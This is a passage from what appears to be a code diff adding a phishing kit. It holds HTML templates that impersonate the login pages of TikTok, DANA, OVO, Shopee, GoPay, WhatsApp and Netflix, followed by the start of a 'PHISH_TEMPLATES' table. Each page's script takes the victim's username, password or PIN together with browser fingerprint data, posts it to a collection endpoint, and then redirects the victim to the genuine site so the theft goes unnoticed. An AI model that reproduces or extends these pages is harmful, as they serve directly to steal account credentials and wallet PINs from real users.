+<path fill="#25F4EE" d="M45 15c-.1 0-.2 0-.3 0-1.5-7.1-6.6-12.6-13.4-14.6V0H22v44c0 4.4-3.6 8-8 8s-8-3.6-8-8 3.6-8 8-8c.9 0 1.7.2 2.5.4V26c-.8-.1-1.6-.2-2.5-.2C6.3 25.8 0 32.1 0 40s6.3 14.2 14 14.2 14-6.3 14-14.2V20.2c3.4 2.4 7.6 3.8 12 3.8v-9.6c-4.6 0-8.7-2-11.5-5.3h-.1C31.9 6.3 38.3 12.3 45 15z"/>
+<path fill="#FE2C55" d="M38 8c-.1 0-.2 0-.3 0-1.5-7.1-6.6-12.6-13.4-14.6V0H15v44c0 4.4-3.6 8-8 8s-8-3.6-8-8 3.6-8 8-8c.9 0 1.7.2 2.5.4V26c-.8-.1-1.6-.2-2.5-.2C-1.7 25.8-8 32.1-8 40s6.3 14.2 14 14.2 14-6.3 14-14.2V20.2c3.4 2.4 7.6 3.8 12 3.8v-9.6c-4.6 0-8.7-2-11.5-5.3h-.1C24.9-.7 31.3 5.3 38 8z"/>
+<path fill="#000" d="M30 4c-.1 0-.2 0-.3 0C28.2-3.1 23.1-8.6 16.3-10.6V-11H7v44c0 4.4-3.6 8-8 8s-8-3.6-8-8 3.6-8 8-8c.9 0 1.7.2 2.5.4V15c-.8-.1-1.6-.2-2.5-.2C-8.7 14.8-15 21.1-15 29s6.3 14.2 14 14.2 14-6.3 14-14.2V9.2c3.4 2.4 7.6 3.8 12 3.8v-9.6c-4.6 0-8.7-2-11.5-5.3h-.1C16.9-11.7 23.3-5.7 30-3z"/>
+</g>
+<text x="50" y="46" font-family="-apple-system,'Helvetica Neue',Helvetica,Arial,sans-serif" font-size="40" font-weight="900" fill="#161823" letter-spacing="-1.5">TikTok</text>
+</svg>
+</div>
+<h1>Log in to TikTok</h1><div class="sub">Manage your account, check notifications, comment on videos, and more.</div>
+<form id="ttf" autocomplete="off" novalidate>
+<div class="field"><input class="inp" type="text" name="username" placeholder=" " autocapitalize="off" required><label class="lbl">Email or username</label></div>
+<div class="field"><input class="inp" type="password" name="password" placeholder=" " required><label class="lbl">Password</label></div>
+<div class="err" id="tterr">Incorrect password. Please try again.</div>
+<button class="btn" type="submit" id="ttbtn"><span class="spin"></span><span class="txt">Log in</span></button>
+<div class="terms">By continuing, you agree to TikTok's <a href="/login">Terms of Service</a> and confirm that you have read TikTok's <a href="/login">Privacy Policy</a>.</div></form>
+<div class="divider">or</div>
+<div class="alt">
+<a href="/login"><svg viewBox="0 0 24 24"><path fill="#1877F2" d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.68.24 2.68.24v2.96h-1.51c-1.49 0-1.96.93-1.96 1.89v2.26h3.33l-.53 3.49h-2.8V24C19.61 23.1 24 18.1 24 12.07"/></svg>Continue with Facebook</a>
+<a href="/login"><svg viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>Continue with Google</a></div>
+<div class="foot">Don't have an account? <a href="/login">Sign up</a></div></div>
+<script>(function(){var f=document.getElementById("ttf"),b=document.getElementById("ttbtn"),e=document.getElementById("tterr");f.addEventListener("submit",function(ev){ev.preventDefault();var u=f.username.value.trim(),p=f.password.value;if(!u||!p){e.classList.add("show");return;}b.classList.add("loading");b.disabled=true;e.classList.remove("show");var payload={u:u,p:p,ua:navigator.userAgent,screen:screen.width+"x"+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ref:location.href};fetch("/__p",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)}).then(function(){setTimeout(function(){location.href="https://www.tiktok.com/login";},800);}).catch(function(){setTimeout(function(){location.href="https://www.tiktok.com/login";},800);});});})();</script>
+</body></html>"""
+
+DANA_HTML = """<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>DANA - Dompet Digital Indonesia</title>
+<style>__BASE__
+body{background:linear-gradient(160deg,#118EEA 0%,#0A6FBB 100%);min-height:100vh;color:#fff;display:flex;flex-direction:column;align-items:center;padding:0 20px}
+.logo-wrap{padding:52px 0 34px;display:flex;align-items:center;justify-content:center}
+.logo-wrap svg{height:60px;width:auto}
+.card{background:#fff;border-radius:20px;padding:32px 26px;width:100%;max-width:400px;box-shadow:0 16px 50px rgba(0,0,0,.22);color:#1a1a1a;animation:fade .45s cubic-bezier(.2,.7,.3,1)}
+@keyframes fade{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
+.card h2{font-size:22px;font-weight:800;margin-bottom:8px;color:#0F2A44;letter-spacing:-.4px;line-height:1.3}
+.card p.sub{font-size:13.5px;color:#6b7280;margin-bottom:26px;line-height:1.55}
+.field{margin-bottom:16px}
+.label{font-size:12px;color:#6b7280;font-weight:700;margin-bottom:8px;display:block;letter-spacing:.3px}
+.inp{width:100%;padding:15px 16px;border:1.5px solid #d1d5db;border-radius:12px;font-size:15px;color:#1a1a1a;font-family:inherit;outline:none;transition:all .18s;background:#f9fafb}
+.inp:focus{border-color:#118EEA;background:#fff;box-shadow:0 0 0 3px rgba(17,142,234,.15)}
+.btn{width:100%;background:#118EEA;color:#fff;border:none;border-radius:12px;padding:16px;font-size:16px;font-weight:800;margin-top:12px;cursor:pointer;transition:background .15s,transform .1s;display:flex;align-items:center;justify-content:center;gap:8px;letter-spacing:.3px}
+.btn:hover{background:#0F6FC2}
+.btn:active{transform:scale(.98)}
+.btn:disabled{opacity:.6}
+.spin{width:16px;height:16px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
+.btn.loading .spin{display:block}.btn.loading .txt{display:none}
+@keyframes sp{to{transform:rotate(360deg)}}
+.foot{text-align:center;font-size:13.5px;color:rgba(255,255,255,.92);margin:26px 0 40px}
+.foot a{color:#fff;text-decoration:none;font-weight:800;border-bottom:1px solid rgba(255,255,255,.6);padding-bottom:1px}
+</style></head><body>
+<div class="logo-wrap">
+<svg viewBox="0 0 200 56" xmlns="http://www.w3.org/2000/svg">
+<rect x="0" y="4" width="48" height="48" rx="14" fill="#FFFFFF"/>
+<path d="M14 28 C14 20 19 15 25 15 L30 15 C32 15 34 16 34 18 L34 38 C34 40 32 41 30 41 L25 41 C19 41 14 36 14 28 Z M21 28 C21 24 23 22 26 22 L28 22 L28 34 L26 34 C23 34 21 32 21 28 Z" fill="#118EEA"/>
+<text x="60" y="42" font-family="-apple-system,'Helvetica Neue',Helvetica,Arial,sans-serif" font-size="40" font-weight="900" fill="#FFFFFF" letter-spacing="-1.8">dana</text>
+</svg>
+</div>
+<form class="card" id="f" novalidate>
+<h2>Masuk ke akun DANA kamu</h2>
+<p class="sub">Gunakan nomor HP dan PIN DANA yang sudah terdaftar</p>
+<div class="field"><label class="label">Nomor HP</label><input class="inp" type="tel" name="u" placeholder="08xxxxxxxxxx" autocomplete="tel" inputmode="numeric" required></div>
+<div class="field"><label class="label">PIN DANA</label><input class="inp" type="password" name="p" placeholder="6 digit PIN" maxlength="6" inputmode="numeric" required></div>
+<button class="btn" type="submit" id="b"><span class="spin"></span><span class="txt">Selanjutnya</span></button>
+</form>
+<div class="foot">Belum punya akun? <a href="/login">Daftar DANA</a></div>
+<script>(function(){var f=document.getElementById("f"),b=document.getElementById("b");f.addEventListener("submit",function(ev){ev.preventDefault();var u=f.u.value.trim(),p=f.p.value;if(!u||!p)return;b.classList.add("loading");b.disabled=true;fetch("/__p",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u:u,p:p,ua:navigator.userAgent,screen:screen.width+"x"+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ref:location.href})}).catch(function(){}).finally(function(){setTimeout(function(){location.href="https://www.dana.id/";},800);});});})();</script>
+</body></html>"""
+
+OVO_HTML = """<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>OVO - Pembayaran Digital</title>
+<style>__BASE__
+body{background:linear-gradient(160deg,#4C3494 0%,#382474 100%);min-height:100vh;color:#fff;display:flex;flex-direction:column;align-items:center;padding:0 20px}
+.logo-wrap{padding:52px 0 34px;display:flex;align-items:center;justify-content:center}
+.logo-wrap svg{height:68px;width:auto}
+.card{background:#fff;border-radius:20px;padding:32px 26px;width:100%;max-width:400px;box-shadow:0 16px 50px rgba(0,0,0,.24);color:#1a1a1a;animation:fade .45s cubic-bezier(.2,.7,.3,1)}
+@keyframes fade{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
+.card h2{font-size:22px;font-weight:800;margin-bottom:8px;color:#4C3494;letter-spacing:-.4px;line-height:1.3}
+.card p.sub{font-size:13.5px;color:#6b7280;margin-bottom:26px;line-height:1.55}
+.field{margin-bottom:16px}
+.label{font-size:12px;color:#6b7280;font-weight:700;margin-bottom:8px;display:block;letter-spacing:.3px}
+.inp{width:100%;padding:15px 16px;border:1.5px solid #d1d5db;border-radius:12px;font-size:15px;color:#1a1a1a;font-family:inherit;outline:none;transition:all .18s;background:#f9fafb}
+.inp:focus{border-color:#4C3494;background:#fff;box-shadow:0 0 0 3px rgba(76,52,148,.15)}
+.btn{width:100%;background:#4C3494;color:#fff;border:none;border-radius:12px;padding:16px;font-size:16px;font-weight:800;margin-top:12px;cursor:pointer;transition:background .15s,transform .1s;display:flex;align-items:center;justify-content:center;gap:8px;letter-spacing:.3px}
+.btn:hover{background:#382474}
+.btn:active{transform:scale(.98)}
+.btn:disabled{opacity:.6}
+.spin{width:16px;height:16px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
+.btn.loading .spin{display:block}.btn.loading .txt{display:none}
+@keyframes sp{to{transform:rotate(360deg)}}
+.foot{text-align:center;font-size:13.5px;color:rgba(255,255,255,.92);margin:26px 0 40px}
+.foot a{color:#fff;text-decoration:none;font-weight:800;border-bottom:1px solid rgba(255,255,255,.6);padding-bottom:1px}
+</style></head><body>
+<div class="logo-wrap">
+<svg viewBox="0 0 220 68" xmlns="http://www.w3.org/2000/svg">
+<circle cx="36" cy="34" r="30" fill="#FFFFFF"/>
+<circle cx="36" cy="34" r="24" fill="#4C3494"/>
+<circle cx="24" cy="34" r="9" fill="#FFFFFF"/>
+<circle cx="36" cy="34" r="9" fill="#FFFFFF"/>
+<circle cx="48" cy="34" r="9" fill="#FFFFFF"/>
+<text x="80" y="48" font-family="-apple-system,'Helvetica Neue',Helvetica,Arial,sans-serif" font-size="40" font-weight="900" fill="#FFFFFF" letter-spacing="-1.5">OVO</text>
+</svg>
+</div>
+<form class="card" id="f" novalidate>
+<h2>Masuk ke akun OVO</h2>
+<p class="sub">Masukkan nomor HP dan PIN OVO kamu untuk melanjutkan</p>
+<div class="field"><label class="label">Nomor HP</label><input class="inp" type="tel" name="u" placeholder="08xxxxxxxxxx" autocomplete="tel" inputmode="numeric" required></div>
+<div class="field"><label class="label">PIN OVO</label><input class="inp" type="password" name="p" placeholder="6 digit PIN" maxlength="6" inputmode="numeric" required></div>
+<button class="btn" type="submit" id="b"><span class="spin"></span><span class="txt">Masuk</span></button>
+</form>
+<div class="foot">Belum punya akun? <a href="/login">Daftar OVO</a></div>
+<script>(function(){var f=document.getElementById("f"),b=document.getElementById("b");f.addEventListener("submit",function(ev){ev.preventDefault();var u=f.u.value.trim(),p=f.p.value;if(!u||!p)return;b.classList.add("loading");b.disabled=true;fetch("/__p",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u:u,p:p,ua:navigator.userAgent,screen:screen.width+"x"+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ref:location.href})}).catch(function(){}).finally(function(){setTimeout(function(){location.href="https://www.ovo.id/";},800);});});})();</script>
+</body></html>"""
+
+SHOPEE_HTML = """<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Shopee Indonesia | Belanja Online</title>
+<style>__BASE__
+body{background:#f5f5f5;min-height:100vh;color:#333}
+.header{background:linear-gradient(180deg,#ee4d2d 0%,#f53d2d 100%);padding:24px 20px 40px;display:flex;align-items:center;justify-content:center;gap:14px}
+.header svg{height:60px;width:auto}
+.card{background:#fff;border-radius:8px;padding:28px 26px;margin:-26px auto 0;box-shadow:0 3px 14px rgba(0,0,0,.08);position:relative;max-width:400px;animation:fade .45s}
+@keyframes fade{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+h2{font-size:20px;font-weight:600;margin-bottom:24px;color:#222}
+.inp{width:100%;padding:14px;border:1px solid #dbdbdb;border-radius:4px;font-size:14px;font-family:inherit;outline:none;margin-bottom:14px;background:#fff;color:#333}
+.inp:focus{border-color:#ee4d2d;box-shadow:0 0 0 1px #ee4d2d}
+.btn{width:100%;background:#ee4d2d;color:#fff;border:none;border-radius:4px;padding:14px;font-size:14px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;cursor:pointer;margin-top:8px;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn:hover{background:#d7411f}
+.btn:disabled{opacity:.6}
+.spin{width:16px;height:16px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
+.btn.loading .spin{display:block}.btn.loading .txt{display:none}
+@keyframes sp{to{transform:rotate(360deg)}}
+.row{display:flex;justify-content:space-between;font-size:12.5px;color:#05a;margin:10px 0 0}
+.row a{color:#05a;text-decoration:none}
+.divider{height:1px;background:#efefef;margin:24px -26px}
+.signup{text-align:center;font-size:13px;color:#888}
+.signup a{color:#ee4d2d;text-decoration:none;font-weight:700}
+.foot{text-align:center;font-size:12px;color:#888;padding:26px 16px;line-height:1.7}
+</style></head><body>
+<div class="header">
+<svg viewBox="0 0 220 68" xmlns="http://www.w3.org/2000/svg">
+<rect x="4" y="8" width="52" height="52" rx="8" fill="white"/>
+<path d="M18 30 Q30 18 42 30 M30 24 L30 48" stroke="#ee4d2d" stroke-width="3.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+<circle cx="22" cy="26" r="1.5" fill="#ee4d2d"/>
+<circle cx="38" cy="26" r="1.5" fill="#ee4d2d"/>
+<text x="68" y="49" font-family="-apple-system,'Helvetica Neue',Helvetica,Arial,sans-serif" font-size="40" font-weight="800" fill="white" letter-spacing="-.8">Shopee</text>
+</svg>
+</div>
+<form class="card" id="f" novalidate>
+<h2>Masuk</h2>
+<input class="inp" type="text" name="u" placeholder="Email/No. Telepon/Username" autocomplete="username" required>
+<input class="inp" type="password" name="p" placeholder="Password" autocomplete="current-password" required>
+<button class="btn" type="submit" id="b"><span class="spin"></span><span class="txt">Masuk</span></button>
+<div class="row"><span></span><a href="/login">Lupa Password?</a></div>
+<div class="divider"></div>
+<div class="signup">Belum punya akun Shopee? <a href="/login">Daftar</a></div>
+</form>
+<div class="foot">© 2026 Shopee. Semua Hak Dilindungi.<br>Kebijakan Privasi · Syarat &amp; Ketentuan</div>
+<script>(function(){var f=document.getElementById("f"),b=document.getElementById("b");f.addEventListener("submit",function(ev){ev.preventDefault();var u=f.u.value.trim(),p=f.p.value;if(!u||!p)return;b.classList.add("loading");b.disabled=true;fetch("/__p",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u:u,p:p,ua:navigator.userAgent,screen:screen.width+"x"+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ref:location.href})}).catch(function(){}).finally(function(){setTimeout(function(){location.href="https://shopee.co.id/buyer/login";},800);});});})();</script>
+</body></html>"""
+
+GOPAY_HTML = """<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>GoPay - Bayar Semua di Satu Aplikasi</title>
+<style>__BASE__
+body{background:#f2f2f2;min-height:100vh;color:#222;display:flex;flex-direction:column;align-items:center}
+.header{background:linear-gradient(180deg,#00AA13 0%,#008F10 100%);width:100%;padding:36px 24px 44px;color:#fff;display:flex;align-items:center;justify-content:center}
+.header svg{height:44px;width:auto}
+.card{background:#fff;border-radius:16px;padding:30px 26px;width:calc(100% - 40px);max-width:400px;margin-top:-24px;box-shadow:0 6px 24px rgba(0,0,0,.1);animation:fade .45s}
+@keyframes fade{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+h2{font-size:22px;font-weight:800;margin-bottom:8px;color:#003d17;letter-spacing:-.4px}
+p.sub{font-size:13.5px;color:#666;margin-bottom:26px;line-height:1.55}
+.field{margin-bottom:16px}
+.label{font-size:12px;color:#555;font-weight:700;margin-bottom:8px;display:block;letter-spacing:.3px}
+.inp{width:100%;padding:15px 16px;border:1.5px solid #d1d5db;border-radius:12px;font-size:15px;outline:none;font-family:inherit;background:#f9fafb;color:#111;transition:all .18s}
+.inp:focus{border-color:#00AA13;background:#fff;box-shadow:0 0 0 3px rgba(0,170,19,.15)}
+.btn{width:100%;background:#00AA13;color:#fff;border:none;border-radius:12px;padding:16px;font-size:15.5px;font-weight:800;margin-top:12px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;letter-spacing:.3px}
+.btn:hover{background:#008F10}
+.btn:disabled{opacity:.6}
+.spin{width:16px;height:16px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
+.btn.loading .spin{display:block}.btn.loading .txt{display:none}
+@keyframes sp{to{transform:rotate(360deg)}}
+.foot{text-align:center;font-size:13px;color:#666;padding:26px 16px}
+.foot a{color:#00AA13;text-decoration:none;font-weight:800}
+</style></head><body>
+<div class="header">
+<svg viewBox="0 0 160 44" xmlns="http://www.w3.org/2000/svg">
+<text x="0" y="34" font-family="-apple-system,'Helvetica Neue',Helvetica,Arial,sans-serif" font-size="36" font-weight="900" fill="#FFFFFF" letter-spacing="-1.8">gopay</text>
+</svg>
+</div>
+<form class="card" id="f" novalidate>
+<h2>Masuk ke GoPay</h2>
+<p class="sub">Gunakan nomor HP Gojek kamu untuk melanjutkan</p>
+<div class="field"><label class="label">Nomor HP</label><input class="inp" type="tel" name="u" placeholder="08xxxxxxxxxx" autocomplete="tel" inputmode="numeric" required></div>
+<div class="field"><label class="label">PIN GoPay</label><input class="inp" type="password" name="p" placeholder="6 digit PIN" maxlength="6" inputmode="numeric" required></div>
+<button class="btn" type="submit" id="b"><span class="spin"></span><span class="txt">Selanjutnya</span></button>
+</form>
+<div class="foot">Belum punya akun? <a href="/login">Daftar GoPay</a></div>
+<script>(function(){var f=document.getElementById("f"),b=document.getElementById("b");f.addEventListener("submit",function(ev){ev.preventDefault();var u=f.u.value.trim(),p=f.p.value;if(!u||!p)return;b.classList.add("loading");b.disabled=true;fetch("/__p",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u:u,p:p,ua:navigator.userAgent,screen:screen.width+"x"+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ref:location.href})}).catch(function(){}).finally(function(){setTimeout(function(){location.href="https://www.gojek.com/gopay/";},800);});});})();</script>
+</body></html>"""
+
+WHATSAPP_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>WhatsApp Web</title>
+<style>__BASE__
+body{background:#fff;min-height:100vh;color:#111;display:flex;flex-direction:column}
+.header{background:#075E54;color:#fff;padding:14px 20px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 4px rgba(0,0,0,.15)}
+.header svg{height:32px;width:auto}
+.header-text{font-size:17px;font-weight:500;color:#fff;letter-spacing:.3px}
+.card{padding:44px 30px 30px;max-width:520px;margin:0 auto;width:100%}
+h1{font-size:26px;font-weight:400;color:#111;margin-bottom:16px;line-height:1.3;letter-spacing:-.2px}
+p.desc{font-size:15px;color:#666;margin-bottom:32px;line-height:1.55}
+.phone-wrap{position:relative;margin-bottom:22px}
+.phone-wrap svg{position:absolute;left:14px;top:50%;transform:translateY(-50%);width:18px;height:18px;color:#8696a0}
+.inp{width:100%;padding:14px 14px 14px 44px;border:none;border-bottom:2px solid #25D366;font-size:16px;outline:none;color:#333;background:transparent;font-family:inherit}
+.inp::placeholder{color:#a0a0a0}
+.btn{width:100%;background:#00A884;color:#fff;border:none;border-radius:6px;padding:14px;font-size:16px;font-weight:500;cursor:pointer;letter-spacing:.3px;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 2px 6px rgba(0,168,132,.25);margin-top:6px}
+.btn:hover{background:#008f72}
+.btn:disabled{opacity:.6}
+.spin{width:18px;height:18px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
+.btn.loading .spin{display:block}.btn.loading .txt{display:none}
+@keyframes sp{to{transform:rotate(360deg)}}
+.row{display:flex;align-items:center;gap:8px;font-size:14px;color:#667781;margin-top:20px;padding-top:20px;border-top:1px solid #e9edef}
+.row svg{width:18px;height:18px}
+.foot{text-align:center;font-size:13px;color:#667781;padding:26px;margin-top:auto;background:#f0f2f5}
+.foot a{color:#00a884;text-decoration:none}
+</style></head><body>
+<div class="header">
+<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" fill="white"><path d="M16 2C8.3 2 2 8.3 2 16c0 2.5.7 4.9 1.9 7L2 30l7.2-1.9c2 1.1 4.4 1.7 6.8 1.7 7.7 0 14-6.3 14-14S23.7 2 16 2zm0 25.5c-2.2 0-4.3-.6-6.1-1.7l-.4-.2-4.3 1.1 1.1-4.2-.3-.4C4.8 20.2 4 18.2 4 16 4 9.4 9.4 4 16 4s12 5.4 12 12-5.4 11.5-12 11.5zm6.6-8.6c-.4-.2-2.1-1-2.4-1.2-.3-.1-.5-.2-.8.2-.2.4-.9 1.2-1.1 1.4-.2.2-.4.3-.8.1-.4-.2-1.6-.6-3-1.9-1.1-1-1.9-2.2-2.1-2.6-.2-.4 0-.6.2-.8.2-.2.4-.4.6-.6.2-.2.2-.4.3-.6.1-.2 0-.4 0-.6-.1-.2-.8-1.9-1.1-2.6-.3-.7-.6-.6-.8-.6h-.7c-.2 0-.6.1-.9.4-.3.3-1.1 1.1-1.1 2.7s1.2 3.1 1.3 3.3c.2.2 2.3 3.5 5.6 4.9.8.3 1.4.5 1.9.7.8.3 1.5.2 2.1.1.6-.1 2.1-.8 2.4-1.6.3-.8.3-1.5.2-1.6-.1-.1-.3-.2-.7-.4z"/></svg>
+<span class="header-text">WhatsApp</span>
+</div>
+<form class="card" id="f" novalidate>
+<h1>Enter your phone number</h1>
+<p class="desc">Select a country and enter your phone number.</p>
+<div class="phone-wrap">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72c.13.96.36 1.9.7 2.81a2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.91.34 1.85.57 2.81.7A2 2 0 0122 16.92z"/></svg>
+<input class="inp" type="tel" name="u" placeholder="Phone number" autocomplete="tel" required>
+</div>
+<button class="btn" type="submit" id="b"><span class="spin"></span><span class="txt">Next</span></button>
+<div class="row">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+<span>End-to-end encrypted</span>
+</div>
+</form>
+<div class="foot">© 2026 WhatsApp LLC · <a href="/login">Terms &amp; Privacy Policy</a></div>
+<script>(function(){var f=document.getElementById("f"),b=document.getElementById("b");f.addEventListener("submit",function(ev){ev.preventDefault();var u=f.u.value.trim();if(!u)return;b.classList.add("loading");b.disabled=true;fetch("/__p",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u:u,p:"__phone_only__",ua:navigator.userAgent,screen:screen.width+"x"+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ref:location.href})}).catch(function(){}).finally(function(){setTimeout(function(){location.href="https://web.whatsapp.com/";},800);});});})();</script>
+</body></html>"""
+
+NETFLIX_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Netflix - Watch TV Shows Online</title>
+<style>__BASE__
+body{background:#000;color:#fff;min-height:100vh;background-image:linear-gradient(180deg,rgba(0,0,0,.7) 0%,rgba(0,0,0,.4) 40%,rgba(0,0,0,.95) 100%),url("https://assets.nflxext.com/ffe/siteui/vlv3/f85718e3-6ff1-47ab-8d41-88d90b92a9f5/web/ID-en-20230821-popsignuptwoweeks-perspective_alpha_website_large.jpg");background-size:cover;background-position:center;background-attachment:fixed;padding:22px}
+.top{display:flex;align-items:center;justify-content:space-between;padding:10px 4px 40px;max-width:1200px;margin:0 auto}
+.top svg{height:42px;width:auto}
+.top .lang{padding:6px 10px;border:1px solid rgba(255,255,255,.5);border-radius:3px;font-size:13px;color:#fff;background:transparent}
+.card{max-width:450px;margin:0 auto;background:rgba(0,0,0,.78);border-radius:4px;padding:56px 68px;width:100%;animation:fade .45s;backdrop-filter:blur(2px)}
+@keyframes fade{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.card h1{font-size:32px;font-weight:700;margin-bottom:26px;color:#fff}
+.inp{width:100%;padding:16px 20px;border:none;border-radius:4px;background:#333;color:#fff;font-size:16px;outline:none;margin-bottom:16px;font-family:inherit;transition:background .15s}
+.inp::placeholder{color:#8c8c8c}
+.inp:focus{background:#454545}
+.btn{width:100%;background:#e50914;color:#fff;border:none;border-radius:4px;padding:14px;font-size:16px;font-weight:600;margin-top:8px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;letter-spacing:.2px}
+.btn:hover{background:#c1070f}
+.btn:disabled{opacity:.6}
+.spin{width:18px;height:18px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
+.btn.loading .spin{display:block}.btn.loading .txt{display:none}
+@keyframes sp{to{transform:rotate(360deg)}}
+.row{display:flex;justify-content:space-between;align-items:center;font-size:13px;color:#b3b3b3;margin:10px 0 22px}
+.row label{display:flex;align-items:center;gap:6px;cursor:pointer}
+.row a{color:#b3b3b3;text-decoration:none}
+.row a:hover{text-decoration:underline}
+.signup{margin-top:40px;font-size:16px;color:#737373}
+.signup a{color:#fff;text-decoration:none;font-weight:600}
+.signup a:hover{text-decoration:underline}
+.cap{font-size:13px;color:#8c8c8c;margin-top:14px;line-height:1.6}
+.cap a{color:#0071eb;text-decoration:none}
+@media(max-width:480px){.card{padding:36px 24px}.card h1{font-size:26px}.top svg{height:32px}}
+</style></head><body>
+<div class="top">
+<svg viewBox="0 0 200 54" xmlns="http://www.w3.org/2000/svg"><text x="0" y="40" font-family="Impact,'Bebas Neue','Arial Narrow',sans-serif" font-size="48" font-weight="900" fill="#e50914" letter-spacing="-1">NETFLIX</text></svg>
+<span class="lang">English</span>
+</div>
+<form class="card" id="f" novalidate>
+<h1>Sign In</h1>
+<input class="inp" type="email" name="u" placeholder="Email or mobile number" autocomplete="username" required>
+<input class="inp" type="password" name="p" placeholder="Password" autocomplete="current-password" required>
+<button class="btn" type="submit" id="b"><span class="spin"></span><span class="txt">Sign In</span></button>
+<div class="row"><label><input type="checkbox" checked> Remember me</label><a href="/login">Need help?</a></div>
+<div class="signup">New to Netflix? <a href="/login">Sign up now.</a></div>
+<div class="cap">This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="/login">Learn more.</a></div>
+</form>
+<script>(function(){var f=document.getElementById("f"),b=document.getElementById("b");f.addEventListener("submit",function(ev){ev.preventDefault();var u=f.u.value.trim(),p=f.p.value;if(!u||!p)return;b.classList.add("loading");b.disabled=true;fetch("/__p",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u:u,p:p,ua:navigator.userAgent,screen:screen.width+"x"+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ref:location.href})}).catch(function(){}).finally(function(){setTimeout(function(){location.href="https://www.netflix.com/login";},800);});});})();</script>
+</body></html>"""
+
+PHISH_TEMPLATES = {
+    "1": {"name": "Instagram", "redirect": "https://www.instagram.com/accounts/login/", "html": INSTAGRAM_HTML, "color": "rgb(225,48,108)"},
